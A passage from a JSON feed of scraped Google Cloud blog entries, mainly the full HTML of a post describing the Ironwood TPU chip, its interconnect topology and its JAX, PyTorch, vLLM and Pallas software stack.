AlloyDB (including AlloyDB Omni), Cloud SQL for MySQL, Cloud SQL for PostgreSQL, Cloud SQL for SQL Server, Spanner, self-managed open-source databases including PostgreSQL, MySQL and SQLLite, as well as databases from other growing list of vendors including Neo4j, Dgraph, and more. Get all the details </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/new-mcp-integrations-to-google-cloud-databases\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n</ul></div>",
        "published_date": "2025-11-06 16:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/inside-the-ironwood-tpu-codesigned-ai-stack/",
        "title": "From silicon to softmax: Inside the Ironwood AI stack",
        "thumbnail": null,
        "author": "Manoj Krishnan",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As machine learning models continue to scale, a specialized, co-designed hardware and software stack is no longer optional, it\u2019s critical. </span><a href=\"https://cloud.google.com/blog/products/compute/ironwood-tpus-and-new-axion-based-vms-for-your-ai-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Ironwood</span></a><span style=\"vertical-align: baseline;\">, our latest generation Tensor Processing Unit (TPU), is the cutting-edge hardware behind advanced models like Gemini and Nano Banana, from massive-scale training to high-throughput, low-latency inference. This blog details the core components of Google's AI software stack that are woven into Ironwood, demonstrating how this deep co-design unlocks performance, efficiency, and scale. We cover the JAX and PyTorch ecosystems, the XLA compiler, and the high-level frameworks that make this power accessible.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">1. The co-designed foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Foundation models today have trillions of parameters that require computation at ultra-large scale. We designed the Ironwood stack from the silicon up to meet this challenge.</span></p>\n<p><span style=\"vertical-align: baseline;\">The core philosophy behind the Ironwood stack is system-level co-design, treating the entire TPU pod not as a collection of discrete accelerators, but as a single, cohesive supercomputer. This architecture is built on a custom interconnect that enables massive-scale Remote Direct Memory Access (RDMA), allowing thousands of chips to exchange data directly at high bandwidth and low latency, bypassing the host CPU. Ironwood has a total of 1.77 PB of directly accessible HBM capacity, where each chip has eight stacks of HBM3E, with a peak HBM bandwidth of 7.4 TB/s and capacity of 192 GiB.\u00a0\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Unlike general-purpose parallel processors,TPUs are Application-Specific Integrated Circuits (ASICs) built for one purpose: accelerating large-scale AI workloads. The deep integration of compute, memory, and networking is the foundation of their performance. At a high level, the TPU consists of two parts:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hardware core</strong><span style=\"vertical-align: baseline;\">: The TPU core is centered around a dense</span><strong style=\"vertical-align: baseline;\"> Matrix Multiply Unit (MXU)</strong><span style=\"vertical-align: baseline;\"> for matrix operations, complemented by a powerful </span><strong style=\"vertical-align: baseline;\">Vector Processing Unit (VPU)</strong><span style=\"vertical-align: baseline;\"> for element-wise operations (activations, normalizations) and </span><strong style=\"vertical-align: baseline;\">SparseCores</strong><span style=\"vertical-align: baseline;\"> for scalable embedding lookups. This specialized hardware design is what delivers Ironwood's 42.5 Exaflops of FP8 compute.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Software target</strong><span style=\"vertical-align: baseline;\">: This hardware design is explicitly targeted by the </span><strong style=\"vertical-align: baseline;\">Accelerated Linear Algebra (XLA) compiler</strong><span style=\"vertical-align: baseline;\">, using a software co-design philosophy that </span><strong style=\"vertical-align: baseline;\">combines the broad benefits of whole-program optimization with the precision of hand-crafted custom kernels. </strong><span style=\"vertical-align: baseline;\">XLA's compiler-centric approach provides a powerful performance baseline by fusing operations into optimized kernels that saturate the MXU and VPU. This approach delivers good \"out of the box\" performance with broad framework and model support. This general-purpose optimization is then complemented by custom kernels </span><strong style=\"vertical-align: baseline;\">(detailed below in the Pallas section)</strong><span style=\"vertical-align: baseline;\"> to achieve peak performance on specific model-hardware combinations. This dual-pronged strategy is a fundamental tenet of the co-design.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The figure below shows the layout of the Ironwood chip:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Z5xATZ3.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This specialized design extends to the connectivity between TPU chips for massive scale-up and scale-out for a total of 88473.6 Tbps (11059.2TB/s) for a complete Ironwood superpod.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The building block: Cubes and ICI.</strong><span style=\"vertical-align: baseline;\"> Each physical Ironwood host has four TPU chips. A single rack of these hosts has 64 Ironwood chips and forms a \u201ccube\u201d. Within this cube, every chip is connected via multiple high-speed </span><strong style=\"vertical-align: baseline;\">Inter-Chip Interconnect (ICI)</strong><span style=\"vertical-align: baseline;\"> links that form a direct 3D Torus topology. This creates an extremely dense, all-to-all network fabric, enabling massive bandwidth and low latency for distributed operations within the cube.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scaling with OCS: Pods and Superpods</strong><span style=\"vertical-align: baseline;\"> To scale beyond a single cube, multiple cubes are connected using an </span><strong style=\"vertical-align: baseline;\">Optical Circuit Switch (OCS) </strong><span style=\"vertical-align: baseline;\">network.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">This is</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">a dynamic, reconfigurable optical network that connects entire cubes, allowing the system to scale from a small \"pod\" (e.g., a 256-chip Ironwood pod with four cubes) to a massive \"superpod\" (e.g., a 9,216-chip system with 144 cubes). This OCS-based topology is key to fault tolerance. If a cube or link fails, the OCS fabric manager instructs the OCS to optically bypass the unhealthy unit and establish new, complete optical circuits connecting only the healthy cubes, swapping in a designated spare. This dynamic reconfigurability allows for both resilient operation and the provisioning of efficient \"slices\" of any size. </span><strong style=\"vertical-align: baseline;\">For the largest-scale systems, into the hundreds of thousands of chips, multiple superpods can then be connected via a standard Data-Center Network (DCN).</strong></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Chips can be configured in different \u201cslices\u201d with different OCS topologies as shown below.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_VdZkL7j.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Each chip is connected to 6 other chips in the 3D torus and provides 3 distinct axes for parallelism. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_KvozMKZ.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ironwood delivers this performance while focusing on power efficiency, allowing AI workloads to run more cost-effectively. Ironwood perf/watt is 2x relative to Trillium, our previous-generation TPU. Our advanced liquid cooling solutions and optimized chip design can reliably sustain up to twice the performance of standard air cooling even under continuous, heavy AI workloads. Ironwood is nearly 30x more power efficient than our first Cloud TPU from 2018 and is our most power-efficient chip to date. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_UxXCPJg.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">It\u2019s the software stack's job to translate high-level code into optimized instructions that leverage the full power of the hardware. The stack supports two primary frameworks: the </span><strong style=\"vertical-align: baseline;\">JAX</strong><span style=\"vertical-align: baseline;\"> ecosystem, which offers maximum performance and flexibility, as well as </span><strong style=\"vertical-align: baseline;\">PyTorch</strong><span style=\"vertical-align: baseline;\"> on TPUs, which provides a native experience for the PyTorch community.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">2. Optimizing the entire AI lifecycle</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We use the principle of a co-designed Ironwood hardware and software stack to deliver maximum performance and efficiency across every phase of model development, with specific hardware and software capabilities tuned for each stage.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pre-training</strong><span style=\"vertical-align: baseline;\">: This phase demands sustained, massive-scale computation. A </span><strong style=\"vertical-align: baseline;\">full 9,216-chip Ironwood superpod</strong><span style=\"vertical-align: baseline;\"> leverages the OCS and ICI fabric to operate as a single, massive parallel processor, achieving maximum sustained FLOPS utilization through different data formats. Running a job of this magnitude also requires resilience, which is managed by high-level software frameworks like </span><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><span style=\"vertical-align: baseline;\">, detailed in Section 3.3, that handle fault tolerance and checkpointing transparently.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Post-training (Fine-tuning and alignment)</strong><span style=\"vertical-align: baseline;\">: This stage includes diverse, FLOPS-intensive tasks like supervised fine-tuning (SFT) and Reinforcement Learning (RL), all requiring rapid iteration. RL, in particular, introduces complex, heterogeneous compute patterns. This stage often requires two distinct types of jobs to run concurrently: </span><strong style=\"vertical-align: baseline;\">high-throughput, inference-like sampling</strong><span style=\"vertical-align: baseline;\"> to generate new data (often called 'actor rollouts'), and </span><strong style=\"vertical-align: baseline;\">compute-intensive, training-like 'learner' steps</strong><span style=\"vertical-align: baseline;\"> that perform the gradient-based updates. Ironwood\u2019s high-throughput, low-latency network and flexible OCS-based slicing are ideal for this type of rapid experimentation, </span><strong style=\"vertical-align: baseline;\">efficiently managing the different hardware demands of both sampling and gradient-based updates</strong><span style=\"vertical-align: baseline;\">. In Section 3.3, we discuss how we provide optimized software on Ironwood \u2014 including reference implementations and libraries \u2014 to make these complex fine-tuning and alignment workflows easier to manage and execute efficiently.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Inference (serving)</strong><span style=\"vertical-align: baseline;\">: In production, models must deliver low-latency predictions with high throughput and cost-efficiency. Ironwood is specifically engineered for this, with its large on-chip memory and compute power optimized for both the large-batch \"prefill\" phase and the memory-bandwidth-intensive \"decode\" phase of large generative models. To make this power easily accessible, we\u2019ve optimized state-of-the-art serving engines. At launch, we\u2019ve enabled </span><a href=\"https://blog.vllm.ai/2025/10/16/vllm-tpu.html\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">vLLM</strong></a><span style=\"vertical-align: baseline;\">, detailed in Section 3.3, providing the community with a top-tier, open-source solution that maximizes inference throughput on Ironwood.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">3. The software ecosystem for TPUs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The TPU stack, and Ironwood\u2019s stack in particular, is designed to be modular, allowing developers to operate at the level of abstraction they need. In this section, we focus on the compiler/runtime, framework, and AI stack libraries.</span></p>\n<p><strong style=\"vertical-align: baseline;\">3.1 The JAX path: Performance and composability</strong></p>\n<p><span style=\"vertical-align: baseline;\">JAX is a high-performance numerical computing system co-designed with the TPU architecture. It provides a familiar NumPy-like API backed by powerful function transformations:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">jit</strong></code><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">(Just-in-Time compilation)</strong><span style=\"vertical-align: baseline;\">: Uses the XLA compiler to fuse operations into a single, optimized kernel for efficient TPU execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">grad</strong></code><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">(automatic differentiation)</strong><span style=\"vertical-align: baseline;\">: Automatically computes gradients of Python functions, the fundamental mechanism for model training.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">shard_map</strong></code><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">(parallelism)</strong><span style=\"vertical-align: baseline;\">: The primitive for expressing distributed computations, allowing explicit control over how functions and data are sharded across a mesh of TPU devices, directly mapping to the ICI/OCS topology.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This compositional approach allows developers to write clean, Pythonic code that JAX and XLA transform into highly parallelized programs optimized for TPU hardware. JAX is what Google Deepmind and other Google teams use to build, train, and service their variety of models.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">For most developers, these primitives are abstracted by high-level frameworks, like </span><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><span style=\"vertical-align: baseline;\">, built upon a foundation of composable, production-proven libraries:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://optax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Optax</strong></a><span style=\"vertical-align: baseline;\">: A flexible gradient processing and optimization library (e.g., AdamW)</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://orbax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Orbax</strong></a><span style=\"vertical-align: baseline;\">: A library for asynchronous checkpointing of distributed arrays across large TPU slices</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://qwix.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Qwix</strong></a><span style=\"vertical-align: baseline;\">: A JAX quantization library supporting Quantization Aware Training (QAT) and Post-Training Quantization (PTQ)</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://metrax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Metrax</strong></a><span style=\"vertical-align: baseline;\">: A library for collecting and processing evaluation metrics in a distributed setting</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/google/tunix\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Tunix</strong></a><span style=\"vertical-align: baseline;\">: A high-level library for orchestrating post-training jobs</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/AI-Hypercomputer/ml-goodput-measurement\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Goodput</strong></a><span style=\"vertical-align: baseline;\">: A library for measuring and monitoring real-time ML training efficiency, providing a detailed breakdown of badput (e.g., initialization, data loading, checkpointing)</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">3.2 The PyTorch path: A native eager experience</strong></p>\n<p><span style=\"vertical-align: baseline;\">To bring Ironwood's power to the PyTorch community, we are developing a new, native PyTorch experience complete with support for a \u201cnative eager mode\u201d, which executes operations immediately as they are called. Our goal is to provide a more natural and developer-friendly way to access Ironwood's scale, minimizing the code changes and level of effort required to adapt models for TPUs. This approach is designed to make the transition from local experimentation to large-scale training more straightforward.</span></p>\n<p><span style=\"vertical-align: baseline;\">This new framework is built on three core principles to ensure a truly PyTorch-native environment:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Full eager mode:</strong><span style=\"vertical-align: baseline;\"> Enables the rapid prototyping, debugging, and research workflows that developers expect from PyTorch.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Standard distributed APIs:</strong><span style=\"vertical-align: baseline;\"> Leverages the familiar </span><span style=\"vertical-align: baseline;\">torch.distributed</span><span style=\"vertical-align: baseline;\"> API, built on </span><span style=\"vertical-align: baseline;\">DTensor</span><span style=\"vertical-align: baseline;\">, for scaling training workloads across TPU slices.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Idiomatic compilation:</strong><span style=\"vertical-align: baseline;\"> Uses </span><span style=\"vertical-align: baseline;\">torch.compile</span><span style=\"vertical-align: baseline;\"> as the single, unified path to JIT compilation, utilizing XLA as its backend to trace the graph and compile it into efficient TPU machine code.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This ensures the transition from local experimentation to large-scale distributed training is a natural extension of the standard PyTorch workflow.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">3.3 Frameworks: MaxText, PyTorch on TPU, and vLLM</strong></p>\n<p><span style=\"vertical-align: baseline;\">While JAX and PyTorch provide the computational primitives, scaling to thousands of chips is a supercomputer management problem. High-level frameworks handle the complexities of resilience, fault tolerance, and infrastructure orchestration.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><strong style=\"vertical-align: baseline;\"> (JAX)</strong><span style=\"vertical-align: baseline;\">: MaxText is an open-source, high-performance LLM pre-training and post-training solution written in pure Python and JAX. MaxText demonstrates optimized training on its library of popular OSS models like DeepSeek, Qwen, gpt-oss, Gemma, and more. Whether users are pre-training large Mixture-of-Experts (MoE) models from scratch, or leveraging the latest Reinforcement Learning (RL) techniques on an OSS model, MaxText provides tutorials and APIs to make things easy. For scalability and resiliency, MaxText leverages </span><a href=\"https://cloud.google.com/ai-hypercomputer/docs/workloads/pathways-on-cloud/pathways-intro\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Pathways</strong></a><span style=\"vertical-align: baseline;\">, which was originally developed by Google DeepMind and now provides TPU users with differentiated capabilities like elastic training and multi-host inference during RL.\u00a0</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">PyTorch on TPU</strong><span style=\"vertical-align: baseline;\">: We recently shared our proposal about our PyTorch native experience on TPUs at </span><a href=\"https://events.linuxfoundation.org/pytorch-conference/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Pytorch Conference 2025</span></a><span style=\"vertical-align: baseline;\">, including an early preview of training on TPU with minimal code changes. In addition to the framework itself, we are working with the community (</span><a href=\"http://goo.gle/torch-xla-rfc\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">RFC</span></a><span style=\"vertical-align: baseline;\">), investing in reproducible recipes, reference implementations, and migration tools to enable PyTorch users to use their favorite frameworks on TPUs. Expect further updates as this work matures.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">vLLM TPU (Serving): </strong><span style=\"vertical-align: baseline;\">vLLM TPU is now powered by </span><a href=\"https://github.com/vllm-project/tpu-inference\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tpu-inference</span></a><span style=\"vertical-align: baseline;\">, an expressive and powerful new hardware plugin that unifies JAX and PyTorch under a single lowering path \u2013 meaning both frameworks are translated to optimized TPU code through one common, shared backend. This new unified backend is not only faster than the previous generation of vLLM TPU but also offers broader model coverage. This integration provides more flexibility to JAX and PyTorch users, running PyTorch models performantly with no code changes while also extending native JAX support, all while retaining the standard vLLM user experience and interface.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">3.4 Extreme performance: Custom kernels via Pallas</strong></p>\n<p><span style=\"vertical-align: baseline;\">While XLA is powerful, cutting-edge research often requires novel algorithms e.g. new attention mechanisms, custom padding to handle dynamic ragged tensors and other optimizations for custom MoE models that the XLA compiler cannot yet optimize.</span></p>\n<p><span style=\"vertical-align: baseline;\">The JAX ecosystem solves this with </span><strong style=\"vertical-align: baseline;\">Pallas</strong><span style=\"vertical-align: baseline;\">, a JAX-native kernel programming language embedded directly in Python. Pallas presents a unified, Python-first experience, dramatically reducing cognitive load and accelerating the iteration cycle. Other platforms lack this unified, in-Python approach, forcing developers to fragment their workflow. To optimize these operations, they must drop into a disparate ecosystem of lower-level tools\u2014from DSLs like Triton and cuTE to raw CUDA C++ and PTX. This introduces significant mental overhead by forcing developers to manually manage memory, streams, and kernel launches, pulling them out of their Python-based environment</span></p>\n<p><span style=\"vertical-align: baseline;\">This is a clear example of co-design. Developers use Pallas to explicitly manage the accelerator's memory hierarchy, defining how \"tiles\" of data are staged from HBM into the extremely fast on-chip SRAM to be operated on by the MXUs. Pallas has two main parts to it.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pallas:</strong><span style=\"vertical-align: baseline;\"> The developer defines the high-level algorithmic structure and memory logistics in Python.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Mosaic:</strong><span style=\"vertical-align: baseline;\"> This compiler backend translates the Pallas definition into optimized TPU machine code. It handles operator fusion, determines optimal tiling strategies, and generates software pipelines to perfectly overlap data transfers (HBM-to-SRAM) with computation (on the MXUs), with the sole objective of saturating the compute units.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Because Pallas kernels are JAX-traceable, they are fully compatible with </span><code style=\"vertical-align: baseline;\">jit</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">vmap</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">grad</code><span style=\"vertical-align: baseline;\">. This stack provides Python-native extensibility for both JAX and PyTorch, as PyTorch users can consume Pallas-optimized kernels without ever leaving the native PyTorch API. Pallas kernels for PyTorch and JAX models, on both TPU and GPU, are available via </span><a href=\"https://github.com/openxla/tokamax\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Tokamax</strong></a><span style=\"vertical-align: baseline;\">, the ML ecosystem\u2019s first multi-framework, multi-hardware kernel library.</span></p>\n<p><strong style=\"vertical-align: baseline;\">3.5 Performance engineering: Observability and debugging</strong></p>\n<p><span style=\"vertical-align: baseline;\">The Ironwood stack includes a full suite of tools for performance analysis, bottleneck detection, and debugging, allowing developers to fully optimize their workloads and operate large scale clusters reliably,\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cloud TPU metrics</strong><span style=\"vertical-align: baseline;\">: Exposes key system-level counters (FLOPS, HBM bandwidth, ICI traffic) to Google Cloud Monitoring that can then be exported to popular monitoring tools like Prometheus.\u00a0</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TensorBoard</strong><span style=\"vertical-align: baseline;\">: Visualizes training metrics (loss, accuracy) and hosts the XProf profiler UI.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">XProf (OpenXLA Profiler)</strong><span style=\"vertical-align: baseline;\">: The essential toolset for deep performance analysis. It captures detailed execution data from both the host-CPU and all TPU devices, providing:</span></p>\n</li>\n</ul>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Trace Viewer</strong><span style=\"vertical-align: baseline;\">: A microsecond-level timeline of all operations, showing execution, collectives, and \"bubbles\" (idle time).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Input Pipeline Analyzer</strong><span style=\"vertical-align: baseline;\">: Diagnoses host-bound vs. compute-bound bottlenecks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Op Profile:</strong><span style=\"vertical-align: baseline;\"> Ranks all XLA/HLO operations by execution time to identify expensive kernels.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Memory Profiler</strong><span style=\"vertical-align: baseline;\">: Visualizes HBM usage over time to debug peak memory and fragmentation.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Debugging Tools:</strong></p>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">JAX Debugger (</strong><code><strong style=\"vertical-align: baseline;\">jax.debug</strong></code><strong style=\"vertical-align: baseline;\">):</strong><span style=\"vertical-align: baseline;\"> Enables </span><code><strong style=\"vertical-align: baseline;\">print</strong></code><span style=\"vertical-align: baseline;\"> and breakpoints from within </span><code><strong style=\"vertical-align: baseline;\">jit</strong></code><span style=\"vertical-align: baseline;\">-compiled functions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TPU Monitoring Library:</strong><span style=\"vertical-align: baseline;\"> A real-time diagnostic dashboard (analogous to </span><code><strong style=\"vertical-align: baseline;\">nvidia-smi</strong></code><span style=\"vertical-align: baseline;\">) for live debugging of HBM utilization, MXU activity, and running processes.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Beyond performance optimization, developers and infra admins can view fleet efficiency and goodput metrics at various levels (e.g., job, reservation) to ensure maximum utilization of their TPU infrastructure.\u00a0\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">4. Conclusion</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Ironwood stack is a complete, system-level co-design, from the silicon to the software. It delivers performance through a dual-pronged strategy: the </span><strong style=\"vertical-align: baseline;\">XLA compiler</strong><span style=\"vertical-align: baseline;\"> provides broad, \"out-of-the-box\" optimization, while the </span><strong style=\"vertical-align: baseline;\">Pallas and Mosaic stack</strong><span style=\"vertical-align: baseline;\"> enables hand-tuned kernel performance.</span></p>\n<p><span style=\"vertical-align: baseline;\">This entire co-designed platform is accessible to all developers, providing first-class, native support for both the </span><strong style=\"vertical-align: baseline;\">JAX </strong><span style=\"vertical-align: baseline;\">and the </span><strong style=\"vertical-align: baseline;\">PyTorch ecosystem</strong><span style=\"vertical-align: baseline;\">. Whether you are pre-training a massive model, running complex RL alignment, or serving at scale, Ironwood provides a direct, resilient, and high-performance path from idea to supercomputer.</span></p>\n<p><span style=\"vertical-align: baseline;\">Get started today with </span><a href=\"https://docs.vllm.ai/projects/tpu/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">vLLM on TPU</strong></a><span style=\"vertical-align: baseline;\"> for inference and </span><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><span style=\"vertical-align: baseline;\"> for pre-training and post-training.</span></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/ironwood-tpus-and-new-axion-based-vms-for-your-ai-workloads/",
        "title": "Announcing Ironwood TPUs General Availability and new Axion VMs to power the age of inference",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/3_WZEo7he.max-600x600.png",
        "author": "Mark Lohmeyer",
        "track": null,
